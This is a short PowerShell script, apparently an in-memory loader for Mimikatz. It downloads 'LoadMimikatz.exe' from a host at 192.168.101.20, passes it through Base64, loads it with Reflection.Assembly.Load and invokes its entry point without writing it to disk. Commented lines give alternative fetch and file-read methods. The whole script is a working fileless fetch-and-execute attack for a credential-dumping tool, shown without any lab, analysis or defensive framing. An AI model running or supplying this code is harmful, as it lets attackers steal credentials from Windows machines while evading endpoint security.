#$assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\PELoaderMimikatz\LoadMimikatz.exe'
#$assemblyByte = (Invoke-WebRequest "http://192.168.101.20:1996/LoadMimikatz.exe").Content
#$assemblyByte = [System.IO.File]::ReadAllBytes($assemblyFile)

$assemblyByte = (New-Object Net.WebClient).DownloadData("http://192.168.101.20:1996/LoadMimikatz.exe")
$assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
$assemblyByte = [System.Convert]::FromBase64String($assemblyB64)
$assembly = [System.Reflection.Assembly]::Load($assemblyByte)
$assembly.EntryPoint.Invoke($null, $null)